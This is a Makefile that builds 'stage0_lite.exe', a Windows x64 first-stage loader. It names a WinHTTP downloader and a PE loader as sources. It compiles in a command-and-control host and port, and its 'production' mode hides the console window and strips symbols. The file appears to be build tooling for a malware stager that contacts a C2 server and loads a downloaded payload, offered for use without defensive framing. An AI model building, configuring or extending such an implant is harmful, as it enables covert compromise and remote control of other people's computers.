# Makefile for stage0-lite
# Cross-compile from Linux using mingw-w64 for Windows x64 target.
#
# Usage:
#   make C2_HOST=192.168.1.1 C2_PORT=4444
#   make C2_HOST=10.0.0.5 C2_PORT=443 PRODUCTION=1

CC      := x86_64-w64-mingw32-gcc
STRIP   := x86_64-w64-mingw32-strip

# ---- Build configuration ----
C2_HOST  ?= CHANGEME_C2_HOST
C2_PORT  ?= 4444
API_PORT ?= 5555
PRODUCTION ?= 0

# ---- Paths ----
SRC_DIR    := src
BUILD_DIR  := build
OUT_EXE    := $(BUILD_DIR)/stage0_lite.exe

# ---- Source files ----
SRCS := \
    $(SRC_DIR)/stage0_lite.c  \
    $(SRC_DIR)/winhttp_dl.c   \
    $(SRC_DIR)/pe_loader.c

OBJS := $(patsubst $(SRC_DIR)/%.c, $(BUILD_DIR)/%.o, $(SRCS))

# ---- Compiler flags ----
# -Os            : optimize for size (primary goal)
# -nostartfiles  : no CRT startup code
# -fno-stack-protector : no stack canary (no CRT)
# -fno-exceptions      : no exception tables
# -fno-asynchronous-unwind-tables : no .eh_frame
# -ffunction-sections -fdata-sections : allow linker dead-code removal
CFLAGS := \
    -Os \
    -fno-stack-protector     \
    -fno-exceptions          \
    -fno-asynchronous-unwind-tables \
    -ffunction-sections      \
    -fdata-sections          \
    -Wall                    \
    -Wextra                  \
    -I$(SRC_DIR)             \
    -DC2_HOST_STR=\"$(C2_HOST)\" \
    -DC2_PORT=$(C2_PORT)         \
    -DAPI_PORT=$(API_PORT)

ifeq ($(PRODUCTION),1)
    # Production: no console window, no debug prints
    CFLAGS += -DNDEBUG
    SUBSYSTEM := -mwindows
else
    # Dev: console window for output
    CFLAGS += -DSTAGE0_CONSOLE
    SUBSYSTEM :=
endif

# ---- Linker flags ----
# -Wl,--gc-sections : remove unused sections (with -ffunction/data-sections)
# -Wl,--strip-all   : remove all symbols
# -Wl,--no-seh      : no structured exception handling tables
LDFLAGS := \
    $(SUBSYSTEM)             \
    -Wl,--gc-sections        \
    -Wl,--strip-all          \
    -Wl,--no-seh             \
    -lwinhttp                \
    -lkernel32               \
    -luser32

.PHONY: all clean

all: $(BUILD_DIR) $(OUT_EXE)

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c
	$(CC) $(CFLAGS) -c $< -o $@

$(OUT_EXE): $(OBJS)
	$(CC) $(OBJS) -o $@ $(LDFLAGS)
	$(STRIP) $@
	@SIZE=$$(du -k $@ | cut -f1); \
	echo ""; \
	echo "✅ stage0_lite.exe built successfully"; \
	echo "   Output : $@"; \
	echo "   Size   : $${SIZE} KB"; \
	echo ""

clean:
	rm -rf $(BUILD_DIR)
